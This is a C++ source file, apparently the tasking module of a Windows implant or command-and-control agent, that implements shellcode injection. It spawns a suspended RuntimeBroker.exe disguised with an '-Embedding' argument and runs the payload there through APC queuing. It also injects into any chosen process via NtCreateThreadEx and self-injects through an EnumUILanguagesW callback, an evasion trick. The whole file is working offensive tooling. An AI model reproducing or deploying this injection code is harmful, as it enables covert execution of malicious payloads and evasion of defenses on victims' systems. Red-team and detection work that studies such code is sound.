//
// Created by diago on 2024-05-27.
//

#include <injection.hpp>


bool
tasking::queue_apc(HANDLE hthread, void* address, const bool resume_thread) {

    if(!QueueUserAPC(
        static_cast<PAPCFUNC>(address),
        hthread,
        0
    )) {
        return false;
    }

    if(resume_thread) {
        ResumeThread(hthread);
    }

    return true;
}

bool
tasking::queue_apc_with_arguments(
        HANDLE hthread,
        void* address,
        void* arg1,
        void* arg2,
        void* arg3,
        const bool resume_thread
    ) {

    fnNtQueueApcThread pqueue_apc = reinterpret_cast<decltype(pqueue_apc)>\
        (GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtQueueApcThread"));

    if(pqueue_apc == nullptr) {
        return false;
    }


    NTSTATUS status = pqueue_apc(
        hthread,
        address,
        arg1,
        arg2,
        arg3
    );

    if(status != ERROR_SUCCESS) {
        return false;
    }


    if(resume_thread) {
        ResumeThread(hthread);
    }

    return true;
}


std::string
tasking::shellcode_inject_child(void* payload, uint32_t payload_size, const bool get_output) {

    PROCESS_INFORMATION proc_info   = { 0 };
    STARTUPINFOA        startupinfo = { 0 };

    std::string image_path;
    std::string command_line;
    std::string curr_directory;
    std::string proc_output;

    HANDLE hreadpipe    = nullptr;
    HANDLE hwritepipe   = nullptr;

    uint32_t    bytes_written               = 0;
    uint32_t    pipe_bytes_read             = 0;

    char        windows_directory[MAX_PATH] = { 0 };
    char*       heapbuff                    = nullptr;
    char*       pipe_output                 = nullptr;
    void*       remote                      = nullptr;

    //---------------------------------------------------------//

    auto _ = defer([&]() {
        CLOSE_HANDLE(proc_info.hProcess);
        CLOSE_HANDLE(proc_info.hThread);
        CLOSE_HANDLE(hreadpipe);
        CLOSE_HANDLE(hwritepipe);
        FREE_HEAP_BUFFER(heapbuff);
        FREE_HEAP_BUFFER(pipe_output);
    });


    if(!create_anonymous_pipe(&hreadpipe, &hwritepipe)) {
        return io::win32_failure("shellcode_inject_child", "CreatePipe");
    }

    if(!GetWindowsDirectoryA(windows_directory, MAX_PATH)) {
        return io::win32_failure("shellcode_inject_child", "GetWindowsDirectoryA");
    }


    curr_directory  = std::string(windows_directory) + "\\System32";
    image_path      = curr_directory + "\\RuntimeBroker.exe";
    command_line    = image_path + " -Embedding";

    if(get_output) {
        startupinfo.cb          = sizeof(startupinfo);
        startupinfo.hStdError   = hwritepipe;
        startupinfo.hStdOutput  = hwritepipe;
        startupinfo.dwFlags     |= STARTF_USESTDHANDLES;
    }


    //
    // alloc heap buffers
    //

    heapbuff = static_cast<char*>(HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        command_line.size() + 1
    ));

    pipe_output = static_cast<char*>(HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        4096
    ));

    if(heapbuff == nullptr || pipe_output == nullptr) {
        return io::win32_failure("shellcode_inject_child", "HeapAlloc");
    }


    //
    // create child process
    //

    memcpy(heapbuff, command_line.data(), command_line.size());
    if(!CreateProcessA(
        image_path.c_str(),
        heapbuff,
        nullptr,
        nullptr,
        TRUE,
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
        nullptr,
        curr_directory.c_str(),
        &startupinfo,
        &proc_info
    )) {
        return io::win32_failure("shellcode_inject_child", "CreateProcessA");
    }

    //
    // allocate payload, queue APCs.
    //

    remote = remote_alloc(proc_info.hProcess, nullptr, payload_size, PAGE_READWRITE);
    if(remote == nullptr) {
        return io::win32_failure("shellcode_inject_child", "VirtualAllocEx");
    }

    if(!remote_write(proc_info.hProcess, remote, payload, payload_size, PAGE_EXECUTE_READWRITE)) {
        return io::win32_failure("shellcode_inject_child", "VirtualProtectEx");
    }

    if(!queue_apc(proc_info.hThread, remote, false)) {
        return io::win32_failure("shellcode_inject_child", "QueueUserAPC");
    }


    //
    // For shellcode that does not call ExitProcess or ExitThread on its own, we can do this to
    // ensure that it exits after executing the first APC. Otherwise, if we're reading from the pipe, we'll
    // block indefinitely because the thread will go back to the entry point after the APC finishes.
    //

    if(!queue_apc_with_arguments(proc_info.hThread, ExitProcess, EXIT_SUCCESS, nullptr, nullptr, false)) {
        return io::win32_failure("shellcode_inject_child", "QueueUserAPC(2)");
    }

    ResumeThread(proc_info.hThread);

    if(get_output) {
        CloseHandle(hwritepipe);
        hwritepipe = nullptr;
        std::string full_output;

        while(ReadFile(
            hreadpipe,
            pipe_output,
            4095,
            reinterpret_cast<LPDWORD>(&pipe_bytes_read),
            nullptr
        ) && pipe_bytes_read > 0) {
            full_output += pipe_output;
            memset(pipe_output, '\0', 4096);
        }

        if(!full_output.empty()) {
            return std::string("Output from shellcode injection into child process with PID ")
                + std::to_string(proc_info.dwProcessId) + ":\n"
                + full_output;

        }
    }

    return "successfully injected shellcode into process with PID: " + std::to_string(proc_info.dwProcessId);
}


std::string
tasking::shellcode_remote_inject(const uint32_t pid, void const *payload, const uint32_t payload_size) {

    HANDLE               hprocess         = nullptr;
    HANDLE               hthread          = nullptr;
    void*                remote_mem       = nullptr;
    fnNtCreateThreadEx   pcreate_threadex = nullptr;
    NTSTATUS             status           = 0;

    //-------------------------------------------------//

    auto _ = defer([&]() {
        CLOSE_HANDLE(hprocess);
        CLOSE_HANDLE(hthread);
    });

    if(!get_function_ptr(pcreate_threadex, "NTDLL.DLL", "NtCreateThreadEx")) {
        return io::win32_failure("shellcode_remote_inject", "GetProcAddress");
    }

    //
    // open process handle
    //

    hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hprocess == nullptr || hprocess == INVALID_HANDLE_VALUE) {
        return io::win32_failure("shellcode_remote_inject", "OpenProcess");
    }

    //
    // allocate
    //

    remote_mem = remote_alloc(hprocess, nullptr, payload_size, PAGE_READWRITE);
    if(remote_mem == nullptr) {
        return io::win32_failure("shellcode_remote_inject", "VirtualAllocEx");
    }

    if(!remote_write(hprocess, remote_mem, const_cast<void*>(payload), payload_size, PAGE_EXECUTE_READWRITE)) {
        return io::win32_failure("shellcode_remote_inject", "WriteProcessMemory");
    }

    //
    // run
    //

    status = pcreate_threadex(
        &hthread,
        THREAD_ALL_ACCESS,
        nullptr,
        hprocess,
        remote_mem,
        nullptr,
        0,0,0,0,
        nullptr
    );

    if(status != ERROR_SUCCESS) {
        return io::nt_failure("shellcode_remote_inject", "NtCreateThreadEx", status);
    }

    return std::string("thread with TID ")              +
        std::to_string(GetThreadId(hthread))            +
        " running payload inside of process with PID: " +
        std::to_string(pid);
}


std::string
tasking::shellcode_self_inject(void const* payload, const uint32_t payload_size) {

    void* alloc_pages = VirtualAlloc(
        nullptr,
        payload_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if(alloc_pages == nullptr) {
        return io::win32_failure("run_shellcode", "VirtualAlloc");
    }

    memcpy(alloc_pages, payload, payload_size);
    uint32_t old_protect = 0;

    if(!VirtualProtect(
        alloc_pages,
        payload_size,
        PAGE_EXECUTE_READWRITE,
        reinterpret_cast<PDWORD>(&old_protect)
    )) {
        return io::win32_failure("run_shellcode", "VirtualProtect");
    }

    if(!EnumUILanguagesW(
        reinterpret_cast<UILANGUAGE_ENUMPROCW>(alloc_pages),
        MUI_LANGUAGE_NAME,
        0
    )) {
        return io::win32_failure("run_shellcode", "EnumUILanguagesW");
    }

    return "successfully ran shellcode.";
}


std::string
tasking::run_shellcode(
        const uint32_t pid,
        const bool inject_child,
        const bool get_output_if_child,
        const std::string& shellcode_buffer
    ) {

    if(inject_child) {
        return shellcode_inject_child((void*)shellcode_buffer.data(), shellcode_buffer.size(), get_output_if_child);
    } if(pid == GetCurrentProcessId()) {
        return shellcode_self_inject(shellcode_buffer.data(), shellcode_buffer.size());
    } if(pid != 0) {
        return shellcode_remote_inject(pid, shellcode_buffer.data(), shellcode_buffer.size());
    }

    return "invalid PID provided.";
}